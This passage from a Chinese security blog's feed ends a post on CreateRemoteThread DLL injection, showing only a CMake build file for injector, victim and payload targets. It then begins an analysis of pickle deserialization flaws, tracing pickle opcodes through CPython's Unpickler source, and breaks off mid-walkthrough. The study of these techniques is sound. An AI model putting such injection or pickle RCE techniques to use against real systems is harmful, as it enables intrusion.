&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-cmake" data-lang="cmake">&lt;span class="c"># CMakeLists.txt
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="nb">cmake_minimum_required&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">VERSION&lt;/span> &lt;span class="s">3.20&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="nb">project&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="s">windows-codeinjection&lt;/span>
&lt;span class="s">VERSION&lt;/span> &lt;span class="s">0.1.0&lt;/span>
&lt;span class="s">LANGUAGES&lt;/span> &lt;span class="s">CXX&lt;/span>
&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="nb">add_executable&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">injector&lt;/span> &lt;span class="s">injector/main.cpp&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="nb">add_executable&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">victim&lt;/span> &lt;span class="s">victim/main.cpp&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="nb">add_library&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">payload&lt;/span> &lt;span class="s">SHARED&lt;/span> &lt;span class="s">payload/main.cpp&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>最终验证结果&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/%E5%9F%BA%E4%BA%8Ecreateremotethread%E7%9A%84dll%E6%B3%A8%E5%85%A5/image-20220711153811971.png"
width="577"
height="595"
srcset="https://nnnewb.github.io/blog/blog/p/%E5%9F%BA%E4%BA%8Ecreateremotethread%E7%9A%84dll%E6%B3%A8%E5%85%A5/image-20220711153811971_huc97e2c808d003a774f83d98497b007c5_19412_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/%E5%9F%BA%E4%BA%8Ecreateremotethread%E7%9A%84dll%E6%B3%A8%E5%85%A5/image-20220711153811971_huc97e2c808d003a774f83d98497b007c5_19412_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="验证结果"
class="gallery-image"
data-flex-grow="96"
data-flex-basis="232px"
>&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>哈，魔术师的秘密。&lt;/p></description></item><item><title>pickle反序列化漏洞浅析</title><link>https://nnnewb.github.io/blog/p/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/</link><pubDate>Fri, 24 Jun 2022 18:11:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>挑了个好捏的软柿子下手，来看下反序列化漏洞一般什么原理。&lt;/p>
&lt;h2 id="原理">原理&lt;/h2>
&lt;h3 id="概述">概述&lt;/h3>
&lt;p>Python 是个动态类型且高度灵活的语言，这意味着直接按内存布局序列化基本是没戏的。想序列化一个Python中的实例，很大程度要依靠Python的高度灵活性。&lt;/p>
&lt;p>pickle 是一种 Python 的序列化库（或者，序列化协议？），其优势是几乎能序列化任何 Python 对象，但为了实现这种优势，pickle 会根据输入而执行指定的函数，从而造成RCE。&lt;/p>
&lt;p>可以用 &lt;code>fickling&lt;/code> 和 &lt;code>pickletools&lt;/code> 这两个工具分析 pickle 序列化后的字节序列。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20220624162554139.png"
width="1587"
height="433"
srcset="https://nnnewb.github.io/blog/blog/p/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20220624162554139_hu0f0622ef2bea9e4acb18c7285499bd00_36179_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20220624162554139_hu0f0622ef2bea9e4acb18c7285499bd00_36179_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="序列化简单列表"
class="gallery-image"
data-flex-grow="366"
data-flex-basis="879px"
>&lt;/p>
&lt;h3 id="反序列化">反序列化&lt;/h3>
&lt;p>接着分析下序列化后的这些数据是怎么还原成 Python 对象的。以 &lt;code>pickle.dumps([1,2,3])&lt;/code> 的结果为例，以 &lt;code>pickletools.dis&lt;/code> 还原成字节码，Python 3.7.9 pickle 模块源码 &lt;a class="link" href="https://github.com/python/cpython/blob/13c94747c74437e594b7fc242ff7da668e81887c/Lib/pickle.py" target="_blank" rel="noopener"
>pickle.py&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext"> 0: \x80 PROTO 3
2: ] EMPTY_LIST
3: q BINPUT 0
5: ( MARK
6: K BININT1 1
8: K BININT1 2
10: K BININT1 3
12: e APPENDS (MARK at 5)
13: . STOP
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>pickle 反序列化是一个类似基于栈的虚拟机，上面恢复的字节码等于这个虚拟机的汇编指令。上面第一列是偏移值，单位字节。第二、三列理解成指令，第四列自然是操作数。&lt;/p>
&lt;p>然后我们看 &lt;code>pickle.py&lt;/code> 中如何把上面这些”指令“恢复成 Python 对象。&lt;/p>
&lt;h4 id="vm模型">vm模型&lt;/h4>
&lt;p>先看 &lt;code>pickle.py&lt;/code> 中的 &lt;code>_Unpickler&lt;/code> 类，跳转到&lt;code>load&lt;/code>方法。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python"> &lt;span class="k">def&lt;/span> &lt;span class="nf">load&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;Read a pickled object representation from the open file.
&lt;/span>&lt;span class="s2">
&lt;/span>&lt;span class="s2"> Return the reconstituted object hierarchy specified in the file.
&lt;/span>&lt;span class="s2"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span class="c1"># Check whether Unpickler was initialized correctly. This is&lt;/span>
&lt;span class="c1"># only needed to mimic the behavior of _pickle.Unpickler.dump().&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="nb">hasattr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;_file_read&amp;#34;&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="k">raise&lt;/span> &lt;span class="n">UnpicklingError&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Unpickler.__init__() was not called by &amp;#34;&lt;/span>
&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">%s&lt;/span>&lt;span class="s2">.__init__()&amp;#34;&lt;/span> &lt;span class="o">%&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="vm">__class__&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="vm">__name__&lt;/span>&lt;span class="p">,))&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_unframer&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">_Unframer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_file_read&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_file_readline&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_unframer&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">readline&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_unframer&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">readline&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">metastack&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[]&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stack&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[]&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stack&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">proto&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;span class="n">read&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>
&lt;span class="n">dispatch&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">dispatch&lt;/span>
&lt;span class="k">try&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">while&lt;/span> &lt;span class="kc">True&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">key&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">key&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">raise&lt;/span> &lt;span class="ne">EOFError&lt;/span>
&lt;span class="k">assert&lt;/span> &lt;span class="nb">isinstance&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">key&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">bytes_types&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">dispatch&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">key&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]](&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">except&lt;/span> &lt;span class="n">_Stop&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">stopinst&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">stopinst&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">value&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这里已经出现了核心逻辑和最重要的几个属性：&lt;code>stack&lt;/code>、&lt;code>metastack&lt;/code>、&lt;code>dispatch&lt;/code>。&lt;/p>
&lt;p>&lt;code>stack&lt;/code>顾名思义即可，&lt;code>dispatch&lt;/code>则是一个 opcode 到 &lt;code>_Unpickler&lt;/code> 方法的映射字典。opcode 定义在这个文件的 98~179 行。&lt;/p>
&lt;p>在重要数据结构初始化后，接下来是主循环，从输入中读&lt;code>key&lt;/code>（指令），派发执行。&lt;/p>
&lt;h4 id="proto">PROTO&lt;/h4>
&lt;p>回顾上一节的字节码，我们从 &lt;code>PROTO 3&lt;/code> 开始看 pickle 如何处理这些指令。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python"> &lt;span class="k">def&lt;/span> &lt;span class="nf">load_proto&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">proto&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="n">proto&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="n">HIGHEST_PROTOCOL&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">raise&lt;/span> &lt;span class="ne">ValueError&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;unsupported pickle protocol: &lt;/span>&lt;span class="si">%d&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">%&lt;/span> &lt;span class="n">proto&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">proto&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">proto&lt;/span>
&lt;span class="n">dispatch&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">PROTO&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">load_proto&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>PROTO 3&lt;/code> 指令读了操作数 &lt;code>3&lt;/code> 并赋值。注意看&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext"> 0: \x80 PROTO 3
2: ] EMPTY_LIST
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>PROTO 3&lt;/code> 正好 2 字节，在&lt;code>load&lt;/code>中读取的第一个字节表示&lt;code>proto&lt;/code>指令，操作数&lt;code>3&lt;/code>是第二个字节。&lt;/p>
&lt;h4 id="empty_list">EMPTY_LIST&lt;/h4>
&lt;p>&lt;code> EMPTY_LIST&lt;/code> 我们继续看这个指令。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python"> &lt;span class="k">def&lt;/span> &lt;span class="nf">load_empty_list&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">([])&lt;/span>
&lt;span class="n">dispatch&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">EMPTY_LIST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">load_empty_list&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>self.append&lt;/code> 是 &lt;code>self.stack.append&lt;/code> 的别名，我们在 &lt;code>load&lt;/code> 函数定义里已经知道了这一点。这一步往栈中压了一个空的列表&lt;code>list&lt;/code>。&lt;/p>
&lt;h4 id="binput">BINPUT&lt;/h4>
&lt;p>&lt;code>BINPUT 0&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python"> &lt;span class="k">def&lt;/span> &lt;span class="nf">load_binput&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">raise&lt;/span> &lt;span class="ne">ValueError&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;negative BINPUT argument&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">memo&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="n">dispatch&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">BINPUT&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">load_binput&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>在&lt;code>PUT&lt;/code>系列指令的定义处有注释：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">PUT&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;p&amp;#39;&lt;/span> &lt;span class="c1"># store stack top in memo; index is string arg&lt;/span>
&lt;span class="n">BINPUT&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;q&amp;#39;&lt;/span> &lt;span class="c1"># &amp;#34; &amp;#34; &amp;#34; &amp;#34; &amp;#34; ; &amp;#34; &amp;#34; 1-byte arg&lt;/span>
&lt;span class="n">LONG_BINPUT&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;r&amp;#39;&lt;/span> &lt;span class="c1"># &amp;#34; &amp;#34; &amp;#34; &amp;#34; &amp;#34; ; &amp;#34; &amp;#34; 4-byte arg&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>BINPUT&lt;/code> 指令的含义是将栈顶变量（空列表）放到 &lt;code>memo&lt;/code> 中（理解为寄存器？）。这个指令的操作数就相当于是寄存器名了。&lt;/p>
&lt;h4 id="mark">MARK&lt;/h4>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext"> 0: \x80 PROTO 3
2: ] EMPTY_LIST
3: q BINPUT 0
5: ( MARK
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">MARK&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;(&amp;#39;&lt;/span> &lt;span class="c1"># push special markobject on stack&lt;/span>
&lt;span class="c1"># ...&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="nf">load_mark&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">metastack&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stack&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stack&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[]&lt;/span>
&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stack&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>
&lt;span class="n">dispatch&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">MARK&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">load_mark&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>MARK&lt;/code> 指令将栈压到了 &lt;code>metastack&lt;/code> 中，替换了当前栈。应该是一个类似栈帧的机制。&lt;/p>
&lt;h4 id="binint">BININT&lt;/h4>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">BININT&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;J&amp;#39;&lt;/span> &lt;span class="c1"># push four-byte signed int&lt;/span>
&lt;span class="n">BININT1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;K&amp;#39;&lt;/span> &lt;span class="c1"># push 1-byte unsigned int&lt;/span>
&lt;span class="n">LONG&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;L&amp;#39;&lt;/span> &lt;span class="c1"># push long; decimal string argument&lt;/span>
&lt;span class="n">BININT2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;M&amp;#39;&lt;/span> &lt;span class="c1"># push 2-byte unsigned int&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>BININT&lt;/code> 系列的指令都是压栈一个操作数。在&lt;code>MARK&lt;/code>指令后，是连续的三条&lt;code>BININT1&lt;/code>指令。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext"> 5: ( MARK
6: K BININT1 1
8: K BININT1 2
10: K BININT1 3
